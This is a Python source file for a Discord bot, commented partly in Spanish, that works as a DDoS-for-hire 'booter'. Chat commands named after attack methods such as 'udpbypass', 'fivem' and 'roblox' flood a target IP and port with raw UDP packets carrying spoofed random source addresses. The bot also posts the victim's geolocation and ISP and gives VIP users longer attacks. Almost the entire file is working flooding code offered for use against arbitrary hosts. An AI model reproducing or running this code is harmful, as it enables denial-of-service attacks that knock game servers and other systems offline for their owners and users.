import discord
from discord.ext import commands
import asyncio
import threading
import socket
import time
import random
import struct
from datetime import datetime
import aiohttp

TOKEN = 'YOUR_DISCORD_TOKEN'
INTENTS = discord.Intents.default()
INTENTS.message_content = True

bot = commands.Bot(command_prefix='!', intents=INTENTS)

active_attacks = {}
cooldowns = {}
global_attack_running = False
admin_id = 1367535670410875070

all_methods = [
    "hudp", "udpbypass", "dnsbypass", "roblox", "fivem",
    "fortnite", "udpraw", "tcproxies", "tcpbypass", "udppps",
    "samp", "udpquery", "udpmix", "udpnuclear", "udppackets", "udpsockets"
]

# --- Checksum y construcción de paquetes ---

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def build_ip_header(source_ip, dest_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 8 + 1400
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                            ip_frag_off, ip_ttl, ip_proto, ip_check,
                            ip_saddr, ip_daddr)
    ip_check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                            ip_frag_off, ip_ttl, ip_proto, ip_check,
                            ip_saddr, ip_daddr)
    return ip_header

def build_udp_header(source_ip, dest_ip, source_port, dest_port, data):
    udp_length = 8 + len(data)
    udp_check = 0
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_check)
    pseudo_header = struct.pack('!4s4sBBH',
                                socket.inet_aton(source_ip),
                                socket.inet_aton(dest_ip),
                                0,
                                socket.IPPROTO_UDP,
                                udp_length)
    pseudo_packet = pseudo_header + udp_header + data
    udp_check = checksum(pseudo_packet)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_check)
    return udp_header

def raw_udp_spoof(source_ip, dest_ip, dest_port, duration, stop_event):
    timeout = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while time.time() < timeout and not stop_event.is_set():
        source_ip_spoof = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        source_port = random.randint(1024, 65535)
        payload = random._urandom(1400)
        ip_header = build_ip_header(source_ip_spoof, dest_ip)
        udp_header = build_udp_header(source_ip_spoof, dest_ip, source_port, dest_port, payload)
        packet = ip_header + udp_header + payload
        try:
            s.sendto(packet, (dest_ip, 0))
        except Exception:
            continue

# --- Función para obtener info IP ---
async def fetch_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                return await resp.json()
            else:
                return None

# --- Lanzar ataque (ahora con raw_udp_spoof) ---
async def start_attack(ctx, method, ip, port, duration, is_vip=False):
    global global_attack_running

    if not ip or not port or not duration:
        await ctx.send(f"❌ Correct usage: `!{method} <ip> <port> <time>`")
        return

    if ip == "127.0.0.1":
        await ctx.send("🚫 You cannot attack 127.0.0.1.")
        return

    max_time = 3600 if is_vip else 60
    if duration > max_time:
        await ctx.send(f"⏏️ Maximum allowed duration is {max_time} seconds.")
        return

    if ctx.author.id in active_attacks:
        await ctx.send("✔️ You already have an active attack.")
        return

    if ctx.author.id in cooldowns:
        await ctx.send("⏳ Please wait before launching another attack.")
        return

    if global_attack_running:
        await ctx.send("⏏️ Only one global attack can be active at a time.")
        return

    global_attack_running = True
    stop_event = threading.Event()
    active_attacks[ctx.author.id] = stop_event

    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    data = await fetch_ip_info(ip)
    if data and data.get("status") == "success":
        org = data.get("org", "N/A")
        isp = data.get("isp", "N/A")
        country = data.get("country", "N/A")
        region = data.get("regionName", "N/A")
        city = data.get("city", "N/A")
        zip_code = data.get("zip", "N/A")
        timezone = data.get("timezone", "N/A")
        as_info = data.get("as", "N/A")
    else:
        org = isp = country = region = city = zip_code = timezone = as_info = "N/A"

    desc = (
        f"**Status**: [ `Attack Successfully Sent` ]\n"
        f"**Host**: [ `{ip}` ]\n"
        f"**Port**: [ `{port}` ]\n"
        f"**Time**: [ `{duration}` ]\n"
        f"**Method**: [ `{method.upper()}` ]\n"
        f"**Sent On**: [ Date: `{now}` ]\n\n"
        f"**ORG**: [ `{org}` ]\n"
        f"**ISP**: [ `{isp}` ]\n"
        f"**Country**: [ `{country}` ]\n"
        f"**Region**: [ `{region}` ]\n"
        f"**City**: [ `{city}` ]\n"
        f"**ZIP**: [ `{zip_code}` ]\n"
        f"**Timezone**: [ `{timezone}` ]\n"
        f"**AS**: [ `{as_info}` ]"
    )

    embed = discord.Embed(
        title="SureNet ( clients )",
        description=desc,
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

    # Ejecutar ataque en hilo (raw spoof UDP)
    thread = threading.Thread(target=raw_udp_spoof, args=("0.0.0.0", ip, port, duration, stop_event))
    thread.start()

    await asyncio.sleep(duration)
    if not stop_event.is_set():
        stop_event.set()
        await ctx.send(f"✔️ Attack finished for <@{ctx.author.id}>.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global_attack_running = False
    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

# --- Crear comandos dinámicamente para todos los métodos ---
def make_command(method):
    @bot.command(name=method)
    async def cmd(ctx, ip: str = None, port: int = None, duration: int = None):
        # Solo checkeo básico, puedes ampliar permisos aquí
        is_vip = any(role.name == "VIP" for role in ctx.author.roles)
        await start_attack(ctx, method, ip, port, duration, is_vip=is_vip)
    return cmd

for m in all_methods:
    make_command(m)

# --- Comando especial para admin para cancelar ataques ---
@bot.command()
async def stop(ctx):
    if ctx.author.id != admin_id:
        await ctx.send("No tienes permisos para esto.")
        return
    for stop_event in active_attacks.values():
        stop_event.set()
    active_attacks.clear()
    await ctx.send("Todos los ataques fueron detenidos.")

bot.run(TOKEN)
